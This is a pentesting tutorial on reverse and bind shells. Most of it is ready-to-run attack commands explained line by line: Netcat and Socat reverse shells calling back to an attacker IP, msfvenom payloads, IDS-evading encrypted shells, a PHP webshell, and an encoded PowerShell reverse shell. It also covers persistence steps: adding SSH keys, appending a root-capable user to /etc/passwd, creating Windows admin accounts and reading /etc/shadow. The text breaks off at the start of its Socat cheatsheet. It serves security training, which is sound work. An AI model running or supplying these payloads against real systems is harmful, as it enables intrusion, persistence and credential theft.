
# Ultimate Guide to Reverse and Bind Shells for Penetration Testing

## Introduction

Shells are the cornerstone of remote code execution (RCE) in penetration testing. They allow you to interact with a target system’s command-line interface (CLI), executing commands as if you were physically at the machine. Whether you’re exploiting a webserver vulnerability or leveraging a misconfigured service, shells are your first step to gaining control. However, shells can be tricky—unstable, non-interactive, and blocked by firewalls or intrusion detection systems (IDS). This guide is designed to demystify reverse and bind shells, providing you with a **comprehensive, beginner-friendly, and ultra-detailed** resource to master them.



---

## 1. What Is a Shell?

A **shell** is a program that provides a command-line interface to interact with an operating system. It’s the bridge between you and the system, letting you run commands, manage files, and execute scripts. Common shells include:
- **Linux**: `bash` (Bourne Again Shell), `sh` (Bourne Shell), `zsh` (Z Shell).
- **Windows**: `cmd.exe` (Command Prompt), `powershell`.

In penetration testing, a shell is the result of exploiting a vulnerability to gain command execution on a remote system. For example, injecting malicious code into a webserver’s input field might let you run `whoami`, giving you a shell to control the server remotely.

### Key Concepts
- **Shellcode**: The malicious code executed on the target to spawn a shell. It’s often written in languages like C, Python, or PHP and delivered via exploits.
- **Listener**: A tool (e.g., Netcat, Socat) running on your machine or the target to receive or connect to the shell.
- **Interactive vs. Non-Interactive Shells**:
  - **Interactive**: Allows real-time interaction with programs (e.g., SSH prompts asking for “yes/no”). You can use tab completion, arrow keys, and commands like `vim`. Examples: `bash`, `powershell`.
  - **Non-Interactive**: Runs commands without user interaction, limiting functionality (e.g., no tab completion, no SSH prompts). Most basic reverse/bind shells are non-interactive, making them less user-friendly.
- **Stability**: Basic shells are unstable—pressing `Ctrl+C` or resizing the terminal can kill the session. Stabilization techniques (covered later) make them more robust.

### Why Shells Matter
Shells are your foothold in a target system. They let you:
- Gather information (`whoami`, `ifconfig`, `netstat`).
- Upload tools or scripts for further exploitation.
- Escalate privileges (e.g., to root or SYSTEM).
- Pivot to other systems in the network.

However, shells are often a starting point. They’re typically unstable and non-interactive, so you’ll aim to escalate to a **native access method** like SSH (Linux) or RDP (Windows) for a fully-featured experience.

---

## 2. Types of Shells

There are two primary types of shells in pentesting: **reverse shells** and **bind shells**. Each serves a specific purpose based on the target’s network configuration and your attack setup.

### 2.1 Reverse Shell
- **Definition**: The target executes code that connects **back to your machine**, where you’re running a listener to receive the shell.
- **How It Works**:
  1. You set up a listener on your attacking machine (e.g., `nc -lvnp 443`).
  2. The target runs shellcode (e.g., via a web exploit, command injection) that initiates a connection to your listener.
  3. You receive a shell, allowing you to run commands on the target.
- **Advantages**:
  - Bypasses **inbound** firewall rules since the target initiates the outbound connection.
  - Easier to execute and debug, especially in CTF challenges or lab environments like TryHackMe.
  - Common in scenarios where you can inject code (e.g., webshells, exploits).
- **Challenges**:
  - Requires your network to accept incoming connections. Outside labs, you may need to configure port forwarding or use a VPS.
  - Non-interactive and unstable by default, requiring stabilization.
  - Outbound firewall rules on the target may block connections to uncommon ports.
- **Example**:
  - **Attacker (listener)**: `sudo nc -lvnp 443`
  - **Target (shellcode)**: `nc 10.10.10.5 443 -e /bin/bash`
  - **Result**: You receive a shell, and running `whoami` shows the target’s user (e.g., `www-data`).

### 2.2 Bind Shell
- **Definition**: The target runs code to open a port and listen for connections. You connect to that port from your machine to gain a shell.
- **How It Works**:
  1. The target runs shellcode that starts a listener (e.g., `nc -lvnp 4444 -e cmd.exe`).
  2. You connect to the target’s open port from your machine (e.g., `nc 10.10.10.100 4444`).
  3. You gain a shell to run commands.
- **Advantages**:
  - No network configuration needed on your side—you’re just making an outbound connection.
  - Useful when the target’s firewall allows inbound connections on specific ports.
- **Challenges**:
  - **Inbound** firewall rules often block open ports, making bind shells less reliable.
  - Non-interactive and unstable by default.
  - Requires the target to have a tool like Netcat installed or uploaded.
- **Example**:
  - **Target (listener)**: `nc -lvnp 4444 -e cmd.exe`
  - **Attacker (connect)**: `nc 10.10.10.100 4444`
  - **Result**: You connect and get a `cmd.exe` shell, allowing commands like `whoami`.

### Key Takeaway
Reverse shells are more common and reliable due to bypassing inbound firewalls, making them the go-to choice in most scenarios. Bind shells are situational, useful when you can’t receive incoming connections but can connect to the target. Both require stabilization for practical use.

---

## 3. Tools for Shells

A variety of tools help you create, send, receive, and stabilize shells. Here’s a deep dive into each, with their strengths, weaknesses, and use cases.

### 3.1 Netcat (nc)
- **What It Is**: Known as the “Swiss Army Knife” of networking, Netcat is a versatile tool for network interactions, including shells, banner grabbing, and file transfers.
- **Features**:
  - Simple syntax for setting up listeners and connections.
  - Installed by default on most Linux distributions.
  - Windows versions (e.g., `nc.exe`) are available in Kali at `/usr/share/windows-resources/binaries`.
  - Supports basic reverse and bind shells.
- **Drawbacks**:
  - Shells are **unstable**—`Ctrl+C` or terminal resizing can kill the session.
  - **Non-interactive** by default, lacking tab completion or arrow keys.
  - Limited features compared to Socat or Metasploit.
- **Use Cases**:
  - Quick and dirty shells in CTFs or initial exploitation.
  - Environments where only Netcat is available.
- **Basic Commands**:
  - **Listener**: `nc -lvnp <port>` (`-l` listen, `-v` verbose, `-n` no DNS, `-p` port).
  - **Connect**: `nc <target-ip> <port>`.

### 3.2 Socat
- **What It Is**: A more powerful alternative to Netcat, Socat (Socket Cat) connects two points (e.g., a port and your keyboard, or two ports) with advanced features.
- **Features**:
  - More **stable** shells than Netcat out of the box.
  - Supports **encrypted shells** (OPENSSL) to evade IDS.
  - Can create **fully interactive TTY shells** on Linux.
  - Highly flexible, connecting files, ports, or processes.
- **Drawbacks**:
  - **Complex syntax**, requiring careful configuration.
  - Rarely installed by default, often requiring you to upload a binary.
  - Windows shells are no more stable than Netcat’s.
- **Use Cases**:
  - Stable Linux shells, especially interactive ones.
  - Encrypted shells to bypass network monitoring.
  - Advanced scenarios requiring custom connections.
- **Basic Commands**:
  - **Listener**: `socat TCP-L:<port> -`
  - **Connect**: `socat TCP:<ip>:<port> -`.

### 3.3 Msfvenom
- **What It Is**: A standalone tool from the Metasploit Framework for generating payloads, including reverse/bind shells, in various formats (e.g., `.exe`, `.php`, `.py`).
- **Features**:
  - Generates **staged** and **stageless** payloads.
  - Supports **Meterpreter shells**, which are stable and feature-rich.
  - Customizable for different operating systems, architectures, and formats.
  - Integrates with Metasploit’s multi/handler for catching shells.
- **Drawbacks**:
  - **Stageless payloads** are bulkier and more likely to be detected by antivirus.
  - **Staged payloads** require Metasploit’s multi/handler and are harder to set up.
  - Requires knowledge of payload naming conventions.
- **Use Cases**:
  - Generating payloads for specific targets (e.g., Windows x64, Linux x86).
  - Creating Meterpreter shells for advanced post-exploitation.
  - Automating payload creation for exploits.
- **Basic Command**: `msfvenom -p <payload> -f <format> -o <file> LHOST=<ip> LPORT=<port>`

### 3.4 Metasploit Multi/Handler
- **What It Is**: A Metasploit module designed to catch reverse shells, especially staged payloads and Meterpreter shells.
- **Features**:
  - Provides **stable shells** with advanced features (e.g., file upload, privilege escalation).
  - Essential for catching **Meterpreter** and **staged payloads**.
  - Supports multiple simultaneous sessions.
- **Drawbacks**:
  - More complex setup than Netcat or Socat.
  - Requires Metasploit, which may not be available in all environments.
  - Resource-intensive compared to lightweight tools.
- **Use Cases**:
  - Catching Meterpreter shells for Windows or Linux targets.
  - Handling staged payloads in complex exploits.
  - Managing multiple shells in a large engagement.
- **Basic Steps**:
  1. Run `msfconsole`.
  2. Use `use multi/handler`.
  3. Set `PAYLOAD`, `LHOST`, `LPORT`.
  4. Run `exploit -j`.

### 3.5 Other Resources
- **PayloadsAllTheThings**: A GitHub repository with shellcode in languages like Python, PHP, and Perl. Example: [Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet).
- **PentestMonkey Reverse Shell Cheatsheet**: A concise list of one-liners for reverse shells in various languages.
- **Kali Webshells**: Pre-installed at `/usr/share/webshells`, including `php-reverse-shell.php` for PHP-based reverse shells.
- **SecLists**: A repository with shellcode alongside wordlists, useful for crafting custom payloads.

---

## 4. Creating Shells

Let’s explore how to create reverse and bind shells using Netcat, Socat, and Msfvenom, with **line-by-line explanations** for each command, especially complex ones like the Socat example you highlighted.

### 4.1 Netcat Shells
Netcat is the simplest tool for quick shells, but its simplicity comes with instability.

#### Reverse Shell
- **Attacker (listener)**:
  ```bash
  sudo nc -lvnp 443
  ```
  - **Line-by-Line**:
    - `sudo`: Runs Netcat with root privileges, required for ports below 1024 (e.g., 443).
    - `nc`: Invokes the Netcat binary.
    - `-l`: Sets Netcat to listen mode, waiting for incoming connections.
    - `-v`: Enables verbose output, showing connection details.
    - `-n`: Disables DNS resolution, using IP addresses directly (faster, avoids DNS issues).
    - `-p 443`: Specifies the port to listen on (443, commonly allowed for HTTPS traffic).
- **Target (Linux, with `-e`)**:
  ```bash
  nc 10.10.10.5 443 -e /bin/bash
  ```
  - **Line-by-Line**:
    - `nc`: Invokes Netcat on the target.
    - `10.10.10.5`: The attacker’s IP address to connect to.
    - `443`: The port on the attacker’s machine.
    - `-e /bin/bash`: Executes `/bin/bash` and binds it to the connection, sending a Bash shell to the attacker.
- **Target (Linux, no `-e`)**:
  ```bash
  mkfifo /tmp/f; nc 10.10.10.5 443 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
  ```
  - **Line-by-Line**:
    - `mkfifo /tmp/f`: Creates a named pipe (FIFO) at `/tmp/f` for inter-process communication.
    - `nc 10.10.10.5 443`: Connects to the attacker’s IP and port.
    - `< /tmp/f`: Redirects the pipe’s output to Netcat’s input.
    - `| /bin/sh`: Pipes Netcat’s output (commands from the attacker) to `/bin/sh` for execution.
    - `>/tmp/f`: Redirects `/bin/sh`’s output back to the pipe, completing the loop.
    - `2>&1`: Redirects stderr to stdout, ensuring error messages are sent to the attacker.
    - `; rm /tmp/f`: Removes the temporary pipe after execution.
- **Target (Windows, with `-e`)**:
  ```bash
  nc.exe 10.10.10.5 443 -e cmd.exe
  ```
  - **Line-by-Line**:
    - `nc.exe`: The Windows Netcat binary (must be uploaded).
    - `10.10.10.5 443`: Connects to the attacker’s IP and port.
    - `-e cmd.exe`: Binds `cmd.exe` to the connection, sending a Command Prompt shell.
- **Notes**:
  - Use ports like 80, 443, or 53 to bypass outbound firewalls.
  - The `-e` option is not available in all Netcat versions (e.g., `netcat-openbsd`).

#### Bind Shell
- **Target (Linux, with `-e`)**:
  ```bash
  nc -lvnp 4444 -e /bin/bash
  ```
  - **Line-by-Line**:
    - `nc`: Invokes Netcat.
    - `-l`: Listen mode.
    - `-v`: Verbose output.
    - `-n`: No DNS resolution.
    - `-p 4444`: Listen on port 4444.
    - `-e /bin/bash`: Binds `/bin/bash` to incoming connections.
- **Target (Linux, no `-e`)**:
  ```bash
  mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
  ```
  - **Line-by-Line**: Same as the reverse shell version, but `-lvnp 4444` sets up a listener instead of connecting.
- **Target (Windows, with `-e`)**:
  ```bash
  nc.exe -lvnp 4444 -e cmd.exe
  ```
  - **Line-by-Line**: Similar to Linux, but binds `cmd.exe`.
- **Attacker (connect)**:
  ```bash
  nc 10.10.10.100 4444
  ```
  - **Line-by-Line**:
    - `nc`: Invokes Netcat.
    - `10.10.10.100`: The target’s IP address.
    - `4444`: The port the target is listening on.

### 4.2 Socat Shells
Socat is more complex but offers greater stability and features like encryption.

#### Reverse Shell
- **Attacker (basic listener)**:
  ```bash
  socat TCP-L:443 -
  ```
  - **Line-by-Line**:
    - `socat`: Invokes the Socat binary.
    - `TCP-L:443`: Sets up a TCP listener on port 443 (`L` for listen).
    - `-`: Connects the listener to standard input/output (your keyboard/terminal).
- **Target (Linux)**:
  ```bash
  socat TCP:10.10.10.5:443 EXEC:"bash -li"
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `TCP:10.10.10.5:443`: Connects to the attacker’s IP and port.
    - `EXEC:"bash -li"`: Executes `bash` with `-l` (login shell, loads profile) and `-i` (interactive mode).
- **Target (Windows)**:
  ```bash
  socat TCP:10.10.10.5:443 EXEC:powershell.exe,pipes
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `TCP:10.10.10.5:443`: Connects to the attacker’s IP and port.
    - `EXEC:powershell.exe,pipes`: Executes `powershell.exe`, using `pipes` to handle Unix-style input/output for Windows compatibility.

#### Bind Shell
- **Target (Linux)**:
  ```bash
  socat TCP-L:4444 EXEC:"bash -li"
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `TCP-L:4444`: Listens on port 4444.
    - `EXEC:"bash -li"`: Binds an interactive Bash shell to incoming connections.
- **Target (Windows)**:
  ```bash
  socat TCP-L:4444 EXEC:powershell.exe,pipes
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `TCP-L:4444`: Listens on port 4444.
    - `EXEC:powershell.exe,pipes`: Binds PowerShell with Unix-style I/O.
- **Attacker (connect)**:
  ```bash
  socat TCP:10.10.10.100:4444 -
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `TCP:10.10.10.100:4444`: Connects to the target’s IP and port.
    - `-`: Uses standard input/output for the connection.

#### Fully Stable Linux TTY Reverse Shell
This is the command you highlighted, and it’s a powerful Socat feature for creating a fully interactive shell.
- **Attacker (listener)**:
  ```bash
  socat TCP-L:443 FILE:`tty`,raw,echo=0
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `TCP-L:443`: Sets up a TCP listener on port 443.
    - `FILE:`tty`,raw,echo=0`: Connects the listener to the current terminal (`tty`), with `raw` mode (minimal processing) and `echo=0` (disables local echo for stability).
- **Target**:
  ```bash
  socat TCP:10.10.10.5:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `TCP:10.10.10.5:443`: Connects to the attacker’s IP and port.
    - `EXEC:"bash -li"`: Executes an interactive (`-i`) login (`-l`) Bash shell.
    - `pty`: Allocates a pseudoterminal, enabling interactive features like tab completion.
    - `stderr`: Redirects error messages to the shell, ensuring they’re visible.
    - `sigint`: Passes `Ctrl+C` signals to the shell, allowing you to interrupt commands.
    - `setsid`: Runs the shell in a new session, isolating it from the parent process.
    - `sane`: Normalizes terminal settings for consistent behavior.
- **Notes**:
  - Requires Socat on the target (upload if needed).
  - Creates a fully interactive shell, perfect for commands like `ssh` or `vim`.

### 4.3 Msfvenom Shells
Msfvenom generates payloads for various platforms and formats, with support for **staged** and **stageless** shells.

#### Reverse Shell (Stageless)
- **Command**:
  ```bash
  msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443
  ```
  - **Line-by-Line**:
    - `msfvenom`: Invokes the Msfvenom tool.
    - `-p linux/x64/shell_reverse_tcp`: Specifies a stageless reverse TCP shell for 64-bit Linux.
    - `-f elf`: Sets the output format to ELF (Linux executable).
    - `-o shell.elf`: Saves the payload to `shell.elf`.
    - `LHOST=10.10.10.5`: Sets the attacker’s IP for the shell to connect to.
    - `LPORT=443`: Sets the attacker’s port.
- **Listener**:
  ```bash
  nc -lvnp 443
  ```
  - **Line-by-Line**: See Netcat section.
- **Target**: Run `./shell.elf`.

#### Reverse Shell (Staged, Meterpreter)
- **Command**:
  ```bash
  msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443
  ```
  - **Line-by-Line**:
    - `msfvenom`: Invokes Msfvenom.
    - `-p linux/x64/meterpreter/reverse_tcp`: Specifies a staged Meterpreter reverse TCP shell for 64-bit Linux.
    - `-f elf`: ELF format.
    - `-o shell.elf`: Output file.
    - `LHOST=10.10.10.5`: Attacker’s IP.
    - `LPORT=443`: Attacker’s port.
- **Listener** (Metasploit):
  ```bash
  msfconsole
  use multi/handler
  set PAYLOAD linux/x64/meterpreter/reverse_tcp
  set LHOST 10.10.10.5
  set LPORT 443
  exploit -j
  ```
  - **Line-by-Line**:
    - `msfconsole`: Starts Metasploit.
    - `use multi/handler`: Selects the multi/handler module.
    - `set PAYLOAD linux/x64/meterpreter/reverse_tcp`: Matches the Msfvenom payload.
    - `set LHOST 10.10.10.5`: Sets the listening IP.
    - `set LPORT 443`: Sets the listening port.
    - `exploit -j`: Runs the listener as a background job.

#### Bind Shell
- **Command**:
  ```bash
  msfvenom -p windows/shell_bind_tcp -f exe -o bind.exe LPORT=4444
  ```
  - **Line-by-Line**:
    - `msfvenom`: Invokes Msfvenom.
    - `-p windows/shell_bind_tcp`: Specifies a stageless bind TCP shell for 32-bit Windows.
    - `-f exe`: EXE format.
    - `-o bind.exe`: Output file.
    - `LPORT=4444`: Port for the target to listen on.
- **Target**: Run `bind.exe`.
- **Attacker**:
  ```bash
  nc 10.10.10.100 4444
  ```
  - **Line-by-Line**: See Netcat section.

---

## 5. Stabilizing Shells

Netcat and basic Socat shells are **non-interactive** and **unstable**, lacking features like tab completion and crashing on `Ctrl+C`. Here are three stabilization techniques for Linux (Windows stabilization is limited).

### 5.1 Python Technique (Linux Only)
- **Steps**:
  1. In the shell:
     ```bash
     python -c 'import pty;pty.spawn("/bin/bash")'
     ```
     - **Line-by-Line**:
       - `python`: Invokes Python (try `python2` or `python3` if needed).
       - `-c 'import pty;pty.spawn("/bin/bash")'`: Runs a Python command to import the `pty` module and spawn a Bash shell with a pseudoterminal.
  2. Set terminal type:
     ```bash
     export TERM=xterm
     ```
     - **Line-by-Line**:
       - `export`: Sets an environment variable.
       - `TERM=xterm`: Defines the terminal type as `xterm`, enabling commands like `clear`.
  3. Background the shell with `Ctrl+Z`.
  4. In your terminal:
     ```bash
     stty raw -echo; fg
     ```
     - **Line-by-Line**:
       - `stty raw`: Sets the terminal to raw mode, disabling local processing.
       - `-echo`: Disables local echo, enabling tab completion and arrow keys.
       - `;`: Separates commands.
       - `fg`: Foregrounds the backgrounded shell.
- **Fixing Terminal**:
  ```bash
  reset
  ```
  - **Line-by-Line**:
    - `reset`: Restores terminal settings if echo is broken after the shell dies.
- **Troubleshooting**:
  - If `python` fails, try `python2` or `python3`.
  - Ensure `/bin/bash` exists (fallback to `/bin/sh`).

### 5.2 rlwrap Technique
- **What It Is**: Adds history, tab completion, and arrow keys to shells.
- **Setup**:
  ```bash
  sudo apt install rlwrap
  ```
  - **Line-by-Line**:
    - `sudo`: Runs with root privileges.
    - `apt install rlwrap`: Installs the `rlwrap` package on Debian-based systems (e.g., Kali).
- **Command**:
  ```bash
  rlwrap nc -lvnp 443
  ```
  - **Line-by-Line**:
    - `rlwrap`: Wraps the Netcat command to add history and completion.
    - `nc -lvnp 443`: Standard Netcat listener (see Section 4.1).
- **Stabilization** (Linux):
  - Background with `Ctrl+Z`.
  - Run:
    ```bash
    stty raw -echo; fg
    ```
    - **Line-by-Line**: See Python technique.
- **Notes**: Ideal for Windows shells, which are hard to stabilize otherwise.

### 5.3 Socat Technique (Linux Only)
- **What It Is**: Uses a Netcat shell to upload a Socat binary and create a stable TTY shell.
- **Steps**:
  1. Host Socat binary:
     ```bash
     sudo python3 -m http.server 80
     ```
     - **Line-by-Line**:
       - `sudo`: Runs with root privileges.
       - `python3`: Invokes Python 3.
       - `-m http.server`: Runs Python’s built-in HTTP server module.
       - `80`: Serves on port 80.
  2. In Netcat shell (target):
     ```bash
     wget 10.10.10.5/socat -O /tmp/socat; chmod +x /tmp/socat
     ```
     - **Line-by-Line**:
       - `wget 10.10.10.5/socat`: Downloads the Socat binary from the attacker’s server.
       - `-O /tmp/socat`: Saves it to `/tmp/socat`.
       - `;`: Separates commands.
       - `chmod +x /tmp/socat`: Makes the binary executable.
  3. Run stable Socat shell (see Section 4.2).
- **Troubleshooting**:
  - If `wget` fails, try `curl -o /tmp/socat http://10.10.10.5/socat`.
  - Ensure `/tmp` is writable.

### 5.4 Setting Terminal Size
For programs like `vim` or `nano`:
- **Attacker**:
  ```bash
  stty -a
  ```
  - **Line-by-Line**:
    - `stty -a`: Displays terminal settings, including `rows` and `cols` (e.g., `rows 24; cols 80`).
- **Shell**:
  ```bash
  stty rows 24
  stty cols 80
  ```
  - **Line-by-Line**:
    - `stty rows 24`: Sets the shell’s terminal rows.
    - `stty cols 80`: Sets the columns.

---

## 6. Encrypted Socat Shells

Encrypted shells use **OPENSSL** to secure communication, evading IDS and preventing eavesdropping.

### 6.1 Generating Certificates
- **Commands**:
  ```bash
  openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
  cat shell.key shell.crt > shell.pem
  ```
  - **Line-by-Line (first command)**:
    - `openssl`: Invokes the OpenSSL tool.
    - `req`: Generates a certificate request.
    - `--newkey rsa:2048`: Creates a new 2048-bit RSA key.
    - `-nodes`: Skips encrypting the private key (no password).
    - `-keyout shell.key`: Saves the private key to `shell.key`.
    - `-x509`: Generates a self-signed certificate.
    - `-days 362`: Sets the certificate validity to 362 days.
    - `-out shell.crt`: Saves the certificate to `shell.crt`.
  - **Line-by-Line (second command)**:
    - `cat shell.key shell.crt`: Concatenates the key and certificate.
    - `> shell.pem`: Saves the combined file as `shell.pem`.
- **Notes**:
  - Certificate info (e.g., country, organization) can be blank or random.
  - The `.pem` file is used by the listener.

### 6.2 Reverse Shell
- **Attacker**:
  ```bash
  socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `OPENSSL-LISTEN:443`: Sets up an SSL/TLS listener on port 443.
    - `cert=shell.pem`: Uses the `shell.pem` certificate.
    - `verify=0`: Disables certificate verification (accepts self-signed certs).
    - `-`: Connects to standard input/output.
- **Target (Linux)**:
  ```bash
  socat OPENSSL:10.10.10.5:443,verify=0 EXEC:"bash -li"
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `OPENSSL:10.10.10.5:443`: Connects to the attacker’s SSL/TLS listener.
    - `verify=0`: Disables certificate verification.
    - `EXEC:"bash -li"`: Executes an interactive Bash shell.

### 6.3 Bind Shell
- **Target (Linux)**:
  ```bash
  socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 EXEC:"bash -li"
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `OPENSSL-LISTEN:4444`: Listens on port 4444 with SSL/TLS.
    - `cert=shell.pem`: Uses the certificate.
    - `verify=0`: Disables verification.
    - `EXEC:"bash -li"`: Binds an interactive Bash shell.
- **Attacker**:
  ```bash
  socat OPENSSL:10.10.10.100:4444,verify=0 -
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `OPENSSL:10.10.10.100:4444`: Connects to the target’s SSL/TLS listener.
    - `verify=0`: Disables verification.
    - `-`: Uses standard input/output.

### 6.4 Stable TTY Reverse Shell
- **Attacker**:
  ```bash
  socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `OPENSSL-LISTEN:53`: Sets up an SSL/TLS listener on port 53 (DNS, often allowed).
    - `cert=encrypt.pem`: Uses the `encrypt.pem` certificate.
    - `verify=0`: Disables verification.
    - `FILE:`tty`,raw,echo=0`: Connects to the current terminal in raw mode with no echo.
- **Target**:
  ```bash
  socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
  ```
  - **Line-by-Line**:
    - `socat`: Invokes Socat.
    - `OPENSSL:10.10.10.5:53`: Connects to the attacker’s SSL/TLS listener on port 53.
    - `verify=0`: Disables certificate verification.
    - `EXEC:"bash -li"`: Executes an interactive Bash shell.
    - `pty`: Allocates a pseudoterminal.
    - `stderr`: Shows error messages.
    - `sigint`: Handles `Ctrl+C`.
    - `setsid`: Creates a new session.
    - `sane`: Normalizes terminal settings.

---

## 7. Webshells

A **webshell** is a script (e.g., PHP, ASP) running on a webserver that executes commands, often via URL parameters or forms. It’s ideal when you can upload files but can’t directly execute a reverse/bind shell.

### 7.1 Basic PHP Webshell
- **Code**:
  ```php
  <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
  ```
  - **Line-by-Line**:
    - `<?php`: Starts PHP code.
    - `echo "<pre>"`: Outputs a preformatted text block for clean display.
    - `shell_exec($_GET["cmd"])`: Executes the command passed in the `cmd` URL parameter.
    - `. "</pre>"`: Closes the preformatted block.
    - `?>`: Ends PHP code.
- **Usage**:
  - Save as `webshell.php` and upload.
  - Access: `http://target.com/uploads/webshell.php?cmd=whoami`
  - Example: `http://target.com/uploads/webshell.php?cmd=ifconfig`

### 7.2 PHP Reverse Shell
- **Location**: `/usr/share/webshells/php/php-reverse-shell.php` (Kali).
- **Steps**:
  1. Edit the file:
     ```php
     $ip = '10.10.10.5';  // Your IP
     $port = 443;         // Your port
     ```
     - **Line-by-Line**:
       - `$ip = '10.10.10.5'`: Sets the attacker’s IP.
       - `$port = 443`: Sets the port.
  2. Upload to the target.
  3. Set up listener:
     ```bash
     nc -lvnp 443
     ```
     - **Line-by-Line**: See Netcat section.
  4. Access: `http://target.com/uploads/php-reverse-shell.php`.
- **Notes**: Works on Linux webservers, not Windows by default.

### 7.3 Windows Webshell with PowerShell
- **Webshell**: Use the basic PHP webshell.
- **Command** (URL-encoded PowerShell reverse shell):
  ```url
  powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.10.5%27%2C443%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%20%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
  ```
  - **Line-by-Line (decoded)**:
    - `powershell -c`: Runs PowerShell with a command.
    - `$client = New-Object System.Net.Sockets.TCPClient('10.10.10.5',443)`: Creates a TCP client connecting to the attacker.
    - `$stream = $client.GetStream()`: Gets the data stream for communication.
    - `[byte[]]$bytes = 0..65535|%{0}`: Initializes a byte array for reading data.
    - `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`: Loops while data is received.
    - `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)`: Converts received bytes to a string.
    - `$sendback = (iex $data 2>&1 | Out-String)`: Executes the command and captures output.
    - `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '`: Adds a prompt to the output.
    - `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)`: Converts output to bytes.
    - `$stream.Write($sendbyte,0,$sendbyte.Length)`: Sends the output back.
    - `$stream.Flush()`: Ensures data is sent.
    - `$client.Close()`: Closes the connection.
- **Usage**: `http://target.com/uploads/webshell.php?cmd=<encoded-powershell>`

---

## 8. Next Steps After Gaining a Shell

Shells are a foothold, but they’re often unstable and limited. The goal is to escalate to a **stable, native access method**.

### 8.1 Linux
- **SSH Keys**:
  ```bash
  cat /home/user/.ssh/id_rsa
  echo "ssh-rsa <your-key>" >> /home/user/.ssh/authorized_keys
  ```
  - **Line-by-Line**:
    - `cat /home/user/.ssh/id_rsa`: Displays the user’s private SSH key (if present).
    - `echo "ssh-rsa <your-key>"`: Adds your public key to `authorized_keys`.
    - `>> /home/user/.ssh/authorized_keys`: Appends to the file.
- **Credentials**:
  ```bash
  cat /etc/shadow
  echo "newuser:newpassword:1001:1001::/home/newuser:/bin/bash" >> /etc/passwd
  ```
  - **Line-by-Line**:
    - `cat /etc/shadow`: Displays hashed passwords (requires root).
    - `echo "...": Adds a new user to `/etc/passwd`.
- **Troubleshooting**:
  - Check SSH service: `systemctl status ssh`.
  - Ensure permissions: `chmod 600 /home/user/.ssh/authorized_keys`.

### 8.2 Windows
- **Add Admin User**:
  ```bash
  net user newadmin Password123 /add
  net localgroup administrators newadmin /add
  ```
  - **Line-by-Line**:
    - `net user newadmin Password123 /add`: Creates a new user `newadmin` with password `Password123`.
    - `net localgroup administrators newadmin /add`: Adds `newadmin` to the administrators group.
- **Credentials**:
  ```bash
  reg query HKLM\SOFTWARE
  type "C:\Program Files\FileZilla Server\FileZilla Server.xml"
  ```
  - **Line-by-Line**:
    - `reg query HKLM\SOFTWARE`: Searches the registry for credentials (e.g., VNC passwords).
    - `type "...": Displays the FileZilla config file, which may contain credentials.
- **Access**:
  ```bash
  xfreerdp /v:10.10.10.100 /u:newadmin /p:Password123
  ```
  - **Line-by-Line**:
    - `xfreerdp`: Invokes the FreeRDP client.
    - `/v:10.10.10.100`: Specifies the target IP.
    - `/u:newadmin`: Username.
    - `/p:Password123`: Password.

---

## 9. Cheatsheet

### Netcat
- **Reverse Shell**:
  ```bash
  # Listener
  sudo nc -lvnp 443
  # Target (Linux)
  nc 10.10.10.5 443 -e /bin/bash
  # Target (Linux, no -e)
  mkfifo /tmp/f; nc 10.10.10.5 443 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
  ```
- **Bind Shell**:
  ```bash
  # Target
  nc -lvnp 4444 -e /bin/bash
  # Attacker
  nc 10.10.10.100 4444
  ```
- **Stabilization**:
  ```bash
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  export TERM=xterm
  # Ctrl+Z
  stty raw -echo; fg
  ```

### Socat
- **Reverse Shell**:
